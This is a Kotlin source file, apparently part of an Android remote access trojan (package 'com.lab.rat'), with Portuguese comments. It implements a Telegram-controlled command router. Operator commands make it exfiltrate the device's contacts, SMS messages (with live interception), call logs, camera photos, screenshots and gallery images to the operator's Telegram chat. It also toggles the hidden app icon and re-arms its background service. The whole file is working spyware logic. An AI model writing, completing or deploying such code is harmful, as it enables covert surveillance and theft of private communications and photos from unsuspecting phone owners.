package com.lab.rat.core

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import com.lab.rat.MainActivity
import com.lab.rat.RatService
import com.lab.rat.modules.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.launch
import java.io.File

class CommandRouter(
    private val ctx: Context,           // deve ser o RatService (LifecycleService)
    private val scope: CoroutineScope,
    private val tg: TelegramClient
) {
    fun route(cmdFull: String) {
        scope.launch {
            val cmd = cmdFull.substringBefore(" ")
            val args = cmdFull.substringAfter(" ", "").trim()
            runCatching {
                when (cmd) {
                    "/ping"      -> tg.sendText(ping())
                    "/contacts"  -> contacts(args)
                    "/sms"       -> sms(args)
                    "/calls"     -> calls(args)
                    "/camera"    -> camera(args)
                    "/screenshot"-> screenshot()
                    "/gallery"   -> gallery(args)
                    "/unhide"    -> { unhide(); tg.sendText(
                        "Ícone reativado. Abra o app para re-conceder MediaProjection.") }
                    else         -> tg.sendText(help())
                }
            }.onFailure { tg.sendText("Erro: ${it.message}") }
        }
    }

    private fun help() = """
        Comandos:
        /ping
        /contacts list|export
        /sms list|export|live
        /calls list|export
        /camera front|back
        /screenshot
        /gallery count|list|dump [n]|get <id>
        /unhide
    """.trimIndent()

    private fun ping(): String =
        "Dispositivo: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}\n" +
        "Android: ${android.os.Build.VERSION.RELEASE} " +
        "(SDK ${android.os.Build.VERSION.SDK_INT})"

    private suspend fun contacts(args: String) = when (args) {
        "list" -> tg.sendText(ContactsModule.list(ctx))
        "export" -> ContactsModule.export(ctx)?.let {
            tg.sendDocument(it, "Contatos CSV"); tg.sendText("CSV enviado")
        } ?: tg.sendText("Nenhum contato")
        else -> tg.sendText("Uso: /contacts list|export")
    }

    private suspend fun sms(args: String) = when {
        args == "list" -> tg.sendText(SmsModule.list(ctx))
        args == "export" -> SmsModule.export(ctx)?.let {
            tg.sendDocument(it, "SMS CSV"); tg.sendText("CSV enviado")
        } ?: tg.sendText("Nenhum SMS")
        args == "live" -> tg.sendText(
            "Captura de SMS em tempo real: ATIVA (BroadcastReceiver + goAsync)")
        else -> tg.sendText("Uso: /sms list|export|live")
    }

    private suspend fun calls(args: String) = when (args) {
        "list" -> tg.sendText(CallLogModule.list(ctx))
        "export" -> CallLogModule.export(ctx)?.let {
            tg.sendDocument(it, "Chamadas CSV"); tg.sendText("CSV enviado")
        } ?: tg.sendText("Nenhum chamada registrada")
        else -> tg.sendText("Uso: /calls list|export")
    }

    private suspend fun camera(args: String) {
        val f: File? = when (args) {
            "front" -> CameraModule.capture(ctx, true)
            "back"  -> CameraModule.capture(ctx, false)
            else -> null
        }
        if (f == null && args !in listOf("front", "back")) {
            tg.sendText("Uso: /camera front|back"); return
        }
        if (f != null && tg.sendPhoto(f, "Câmera ${args}"))
            tg.sendText("Foto enviada")
        else tg.sendText("Falha na captura/envio da câmera")
    }

    private suspend fun screenshot() {
        val f = ScreenshotModule.capture(ctx)
        if (f != null && tg.sendPhoto(f, "Screenshot")) {
            tg.sendText("Screenshot enviado")
        } else {
            tg.sendText("Falha. Token de projeção é de uso único no Android 14. " +
                "Use /unhide, abra o app e re-conceda a projeção.")
        }
    }

    private suspend fun gallery(args: String) = when {
        args == "count" -> tg.sendText(GalleryModule.count(ctx))
        args == "list"  -> tg.sendText(GalleryModule.list(ctx))
        args.startsWith("dump") -> {
            val n = args.substringAfter("dump", "").trim().toIntOrNull() ?: 2
            var sent = 0
            GalleryModule.dump(ctx, n) { f -> if (tg.sendPhoto(f, f.name)) { sent++; true } else false }
            tg.sendText("Enviadas $sent imagens (limite 2 por comando)")
        }
        args.startsWith("get") -> {
            val id = args.substringAfter("get", "").trim().toLongOrNull()
            if (id == null) tg.sendText("Uso: /gallery get <id>")
            else GalleryModule.get(ctx, id)?.let {
                tg.sendPhoto(it, it.name); tg.sendText("Enviado")
            } ?: tg.sendText("ID não encontrado")
        }
        else -> tg.sendText("Uso: /gallery count|list|dump [n]|get <id>")
    }

    private fun unhide() {
        ctx.packageManager.setComponentEnabledSetting(
            ComponentName(ctx, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP)
        // Garante que o serviço volte a ficar ativo pós re-concessão
        val pi = PendingIntent.getForegroundService(
            ctx, 11, Intent(ctx, RatService::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        (ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager)
            .setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, pi)
    }
}
